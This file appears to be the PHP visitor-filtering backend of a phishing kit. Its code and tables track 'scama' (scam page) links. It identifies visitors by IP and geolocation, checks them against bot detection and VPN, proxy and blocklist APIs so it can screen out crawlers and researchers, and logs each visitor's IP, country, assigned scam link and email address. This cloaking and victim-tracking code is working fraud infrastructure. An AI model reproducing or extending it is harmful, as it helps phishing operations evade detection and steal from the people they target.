<?php
require_once('../vendor/autoload.php');

use MaxMind\Db\Reader;
use DeviceDetector\DeviceDetector;
use DeviceDetector\Parser\Device\AbstractDeviceParser;

$neutrinoAPIClient = new NeutrinoAPI\NeutrinoAPIClient($_ENV['NEUTRINOAPI_USER_ID'], $_ENV['NEUTRINOAPI_API_KEY']);


function get_client_ip()
{
    $ipaddresstrue = '';

    if (getenv('REMOTE_ADDR') == '127.0.0.1') {
        $ipaddresstrue = '105.214.34.213';
    } else {

        if (getenv('HTTP_CLIENT_IP'))
            $ipaddresstrue = getenv('HTTP_CLIENT_IP');
        else if (getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddresstrue = getenv('HTTP_X_FORWARDED_FOR');
        else if (getenv('HTTP_X_FORWARDED'))
            $ipaddresstrue = getenv('HTTP_X_FORWARDED');
        else if (getenv('HTTP_FORWARDED_FOR'))
            $ipaddresstrue = getenv('HTTP_FORWARDED_FOR');
        else if (getenv('HTTP_FORWARDED'))
            $ipaddresstrue = getenv('HTTP_FORWARDED');
        else if (getenv('REMOTE_ADDR'))
            $ipaddresstrue = getenv('REMOTE_ADDR');
        else
            $ipaddresstrue = '105.214.34.213';
    }
    return trim($ipaddresstrue);
}


function getCountry()
{
    $GeoLite = new Reader('../core/maxmind/GeoLite2-City.mmdb');
    $asn = new Reader('../core/maxmind/GeoLite2-ASN.mmdb');

    $GeoLite = $GeoLite->get(get_client_ip());
    $asn = $asn->get(get_client_ip());

    $result = array(
        'country'           => $GeoLite['country']['names']['en'],
        'country_code'      => $GeoLite['country']['iso_code'],
        'continent'         => $GeoLite['continent']['names']['en'],
        'isp'               => $asn['autonomous_system_organization'],
        'ip'                => get_client_ip(),
    );

    return $result;
}



function check_neutrinoapi_api()
{

    global $neutrinoAPIClient;

    $params = array(

        // An IPv4 or IPv6 address. Accepts standard IP notation (with or without port number), CIDR
        // notation and IPv6 compressed notation. If multiple IPs are passed using comma-separated values
        // the first non-bogon address on the list will be checked
        "ip" => get_client_ip(),

        // Include public VPN provider IP addresses. NOTE: For more advanced VPN detection including the
        // ability to identify private and stealth VPNs use the IP Probe API
        "vpn-lookup" => "true"
    );

    $apiResponse = $neutrinoAPIClient->ipBlocklist($params);

    if ($apiResponse->isOK()) {
        $data = $apiResponse->getData();

        $blocked = false;

        foreach ($data as $key => $value) {
            if ($value === true) {
                $blocked = true;
                break;
            }
        }

        if ($blocked === true) {
            return 'YES';
        } else {
            return 'NO';
        }
    } else {
        header("Location: https://api.erroryall.com", TRUE, 301);
    }
};




function insertVisitor($origin, $linkscama, $blocked, $by_check)
{
    $country = getCountry();
    $ip = $country['ip'];
    $country_code = $country['country_code'];
    $country_name = $country['country'];

    $date = date('Y-m-d H:i:s');

    global $conn;

    $sql = "INSERT INTO visitor (ips, code_country, country, origin, scama,date,blocked,by_check) VALUES (:ip,:country_code,:country_name,:origin,:linkscama,:date,:blocked,:by_check)";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':ip', $ip);
    $stmt->bindParam(':country_code', $country_code);
    $stmt->bindParam(':country_name', $country_name);
    $stmt->bindParam(':origin', $origin);
    $stmt->bindParam(':linkscama', $linkscama);
    $stmt->bindParam(':date', $date);
    $stmt->bindParam(':blocked', $blocked);
    $stmt->bindParam(':by_check', $by_check);
    $stmt->execute();
    $stmt->closeCursor();

    return $conn->lastInsertId();
}

function deviceBot()
{
    AbstractDeviceParser::setVersionTruncation(AbstractDeviceParser::VERSION_TRUNCATION_NONE);
    $ua = $_SERVER['HTTP_USER_AGENT'];
    // $ua = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';
    $dd = new DeviceDetector($ua);
    $dd->parse();
    if ($dd->isBot()) {
        return 'YES';
    } else {
        return 'NO';
    }
}

function check_ip_accpt(){

}

function ipbot()
{
    $proxycheck_options = array(
        'API_KEY' => $_ENV['KEY_PROXY'], // Your API Key.
        'ASN_DATA' => 0, // Enable ASN data response.
        'DAY_RESTRICTOR' => 7, // Restrict checking to proxies seen in the past # of days.
        'VPN_DETECTION' => 1, // Check for both VPN's and Proxies instead of just Proxies.
        'RISK_DATA' => 1, // 0 = Off, 1 = Risk Score (0-100), 2 = Risk Score & Attack History.
        'INF_ENGINE' => 1, // Enable or disable the real-time inference engine.
        'TLS_SECURITY' => 0, // Enable or disable transport security (TLS).
        'QUERY_TAGGING' => 1, // Enable or disable query tagging.
        'MASK_ADDRESS' => 1, // Anonymises the local-part of an email address (e.g. anonymous@domain.tld)
        'CUSTOM_TAG' => '', // Specify a custom query tag instead of the default (Domain+Page).
        'BLOCKED_COUNTRIES' => array('Wakanda', 'WA'), // Specify an array of countries or isocodes to be blocked.
        'ALLOWED_COUNTRIES' => array('Azeroth', 'AJ') // Specify an array of countries or isocodes to be allowed.
    );

    $result_array = \proxycheck\proxycheck::check(get_client_ip(), $proxycheck_options);
    return $result_array;
}

function  insert_scama($linkscama, $emailVisitor)
{
    global $conn;
    $ip = get_client_ip();
    $sql = "INSERT INTO visitor_scama (ips,link_scama,email_visitor,created_at,last_activity) VALUES (:ip,:link_scama,:email_visitor,NOW(),NOW())";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':ip', $ip);
    $stmt->bindParam(':link_scama', $linkscama);
    $stmt->bindParam(':email_visitor', $emailVisitor);
    $stmt->execute();
    $stmt->closeCursor();
    return $conn->lastInsertId();
}

function compare_scama()
{
    global $conn;
    $sql = "SELECT * FROM visitor_scama WHERE ips = :ips";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':ips', get_client_ip());
    $stmt->execute();
    $stmt->setFetchMode(PDO::FETCH_ASSOC);
    $result = $stmt->fetchAll();
    $stmt->closeCursor();
    if (count($result) > 0) {
        return "YES";
    } else {
        return "NO";
    }
}

function result_scama()
{
    global $conn;
    $sql = "SELECT * FROM visitor_scama WHERE ips = :ips";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':ips', get_client_ip());
    $stmt->execute();
    $stmt->setFetchMode(PDO::FETCH_ASSOC);
    $result = $stmt->fetchAll();
    $stmt->closeCursor();
    return $result;
}

function updateActivity($id)
{
    global $conn;
    $sql = "UPDATE visitor_scama SET last_activity = NOW() WHERE id_visitor_scama = :id_visitor_scama";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':id_visitor_scama', $id);
    $stmt->execute();
    $stmt->closeCursor();
    return $conn->lastInsertId();
}

function generateRandomGmail()
{
    $username = generateRandomString(10); // Ganti 10 dengan panjang username yang diinginkan
    $domain = 'fake.com';
    $email = $username . '@' . $domain;
    return $email;
}

function generateRandomString($length)
{
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $string = '';
    for ($i = 0; $i < $length; $i++) {
        $string .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $string;
}
